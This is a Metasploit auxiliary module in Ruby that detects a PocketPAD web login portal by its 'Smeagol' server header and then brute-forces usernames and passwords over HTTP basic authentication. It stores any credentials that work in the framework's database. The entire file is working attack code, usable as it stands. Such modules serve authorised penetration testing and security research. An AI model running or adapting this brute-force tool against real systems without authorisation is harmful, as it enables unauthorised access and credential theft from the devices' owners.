##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
    'Name'           => 'PocketPAD Login Bruteforce Force Utility',
    'Description'    => %{
      This module scans for PocketPAD login portal, and
      performs a login bruteforce attack to identify valid credentials.
    },
    'Author'         =>
      [
        'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
      ],
    'License'        => MSF_LICENSE
    ))

    deregister_options('HttpUsername', 'HttpPassword')
  end

  def run_host(ip)
    unless is_app_popad?
      return
    end

    print_status("Starting login bruteforce...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the target actually isn't PocketPAD
  #

  def is_app_popad?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      vprint_error("HTTP Connection Failed...")
      return false
    end

    if res && res.code == 200 && res.headers['Server'] && res.headers['Server'].include?("Smeagol") && res.body.include?("PocketPAD")
      vprint_good("Running PocketPAD application ...")
      return true
    else
      vprint_error("Application is not PocketPAD. Module will not continue.")
      return false
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_time: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => '/cgi-bin/config.cgi',
        'method'    => 'POST',
        'authorization' => basic_auth(user,pass),
        'vars_post'    => {
          'file' => "configindex.html"
          }
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("HTTP Connection Failed...")
      return :abort
    end

    if (res && res.code == 200 && res.body.include?("Home Page") && res.headers['Server'] && res.headers['Server'].include?("Smeagol"))
      print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'PocketPAD Portal',
        user: user,
        password: pass,
        proof: res.body
      )
      return :next_user
    else
      vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end
  end
end
